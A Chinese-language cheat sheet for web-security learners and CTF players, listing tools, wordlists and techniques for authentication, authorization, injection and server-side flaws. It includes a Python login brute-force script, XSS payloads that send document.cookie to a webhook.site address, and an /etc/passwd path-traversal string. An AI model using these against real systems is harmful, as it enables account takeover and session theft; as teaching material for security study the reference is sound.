# Web安全攻防工具与技巧速查表

本项目旨在为Web攻防学习者和CTF选手提供一份高效、实用的工具和技巧速查表，涵盖常见Web安全漏洞的检测与利用方法，以及配套的工具和脚本推荐。

## 环境与工具建议

- **gobuster**：目录/路径爆破工具
- **Burp Suite**：Web渗透测试神器，建议配置好代理和mtls
- **Python**：建议安装，方便自定义脚本
- **常用爆破脚本**：如用于凭证猜解的脚本
- **常用密码字典**：[xato-net-10-million-passwords-1000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-1000.txt)
- **默认凭证字典**：[default-passwords.csv](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- **常用路径字典**：如 [common.txt](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)
- **webhook**：[webhook.site](https://webhook.site/)
- **hashcat**：本地hash破解工具，[hashcat cheatsheet](https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/)
- **在线hash破解**：[crackstation.net](https://crackstation.net/)
- **Cookie编辑工具**：如EditThisCookie插件，或直接用浏览器开发者工具
- **Nikto**：Web服务器漏洞扫描
- **Cewl**：自定义字典生成工具
- **Payload All The Things**：漏洞Payload集合 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- **CyberChef**：万能编码/解码/分析工具 [CyberChef](https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,''))
- **hash识别**：[tunnelsup hash analyzer](https://www.tunnelsup.com/hash-analyzer/)
- **Base64编码/解码**：[base64decode.org](https://www.base64decode.org/)、[base64encode.org](https://www.base64encode.org/)
- **JWT分析**：[jwt.io](https://jwt.io/)
- **Flask session分析**：[flask-session-cookie-manager](https://noraj.github.io/flask-session-cookie-manager/)、[flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)
- **URL编码解码**：[urldecoder.org](https://www.urldecoder.org/)

---

## 常见漏洞与利用技巧

### 1. 认证相关漏洞（Authentication）

#### 1.1 默认密码
- 检查应用是否有明显的框架标识（如WordPress、Tomcat等）
- 常用默认凭证爆破：[default-passwords.csv](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)

#### 1.2 弱密码
- 利用Python脚本进行密码爆破（示例代码见下方）
- 可用字典：[xato-net-10-million-passwords-1000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-1000.txt)

```python
import requests
import time

wordlist = open("passwords.txt", "r", encoding="utf8").readlines()
url = "https://example.com/login"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

for pwd in wordlist:
    pwd = pwd.strip('\n')
    data = {'username': 'admin', 'password': pwd}
    r = requests.post(url, headers=headers, data=data)
    if "Incorrect" not in r.text:
        print("Password is: " + pwd)
        break
    time.sleep(0.5)
```

#### 1.3 多因素认证（MFA）
- TOTP码可用[totp.danhersam.com](https://totp.danhersam.com/)生成

#### 1.4 SQL注入
- 常用Payload参考：[PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- 可用[guidedctf.sec.edu.au/query-viewer](https://guidedctf.sec.edu.au/query-viewer)可视化SQL查询

#### 1.5 弱会话管理
- 检查Cookie内容，尝试修改角色、用户ID等敏感字段
- JWT、Flask Token分析与伪造见“编码/加密/Token分析”部分

#### 1.6 前端信息泄露
- 检查页面源码与JS文件，查找硬编码凭证或API Key

---

### 2. 授权相关漏洞（Authorization）

#### 2.1 弱会话管理
- 检查Cookie是否可变更为高权限角色或其他用户ID

#### 2.2 API接口/敏感端点泄露
- 检查JS和HTML源码，查找隐藏API端点

#### 2.3 IDOR（不安全直接对象引用）
- 枚举和篡改参数（如id、username、email等），尝试访问他人资源

#### 2.4 URL篡改
- 枚举API路径，尝试越权访问
- 针对403路径继续爆破下级目录

---

### 3. 输入注入类漏洞（Input Injection）

#### 3.1 SQL注入
- 参见认证部分
- Payload参考：[PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

#### 3.2 XSS（跨站脚本攻击）
- 常用Payload参考：[PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- Cookie窃取Payload示例：
  ```html
  <img src=x onerror=this.src='https://webhook.site/xxx?c='+document.cookie>
  <script>fetch('https://webhook.site/xxx?c='+document.cookie)</script>
  ```
- 检查HTTPOnly标志，利用EditThisCookie等工具
- CSP评估：[csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com)

---

### 4. 服务器端攻击（Server Side Attacks）

#### 4.1 路径穿越（Path Traversal）
- 示例Payload：`../../../../../../etc/passwd`
- 详细参考：[PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- 在线练习：[PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)

#### 4.2 本地文件包含（LFI）
- 与路径穿越类似，参考：[PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- 在线练习：[PentesterLab LFI](https://pentesterlab.com/exercises/from_sqli_to_shell/course)

#### 4.3 文件上传漏洞
- 检查文件上传功能，尝试绕过后端校验
- 参考：[PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- 在线练习：[PortSwigger File Upload](https://portswigger.net/web-security/file-upload)

#### 4.4 SSRF（服务器端请求伪造）
- 查找URL或文件路径参数，尝试SSRF Payload
- 参考：[PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- 在线练习：[PortSwigger SSRF](https://portswigger.net/web-security/ssrf)

---

### 5. 编码/加密/Token分析

- **Base64/URL编码识别与解码**：`==`、`=`、`%3d`等结尾多为Base64，可用[CyberChef](https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,''))、[base64decode.org](https://www.base64decode.org/)
- **Hash识别**：[tunnelsup hash analyzer](https://www.tunnelsup.com/hash-analyzer/)
- **JWT分析**：[jwt.io](https://jwt.io/)，支持Payload修改与签名
- **Flask Session分析**：[flask-session-cookie-manager](https://noraj.github.io/flask-session-cookie-manager/)、[flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)
- **URL解码**：[urldecoder.org](https://www.urldecoder.org/)

---

## 推荐资源

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [CyberChef](https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,''))
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PentesterLab](https://pentesterlab.com/exercises/from_sqli_to_shell/course)

---

> 本文档持续更新，欢迎PR补充更多实用技巧和工具！

---

如果需要Markdown源码或有特定排版需求，也可以告知！
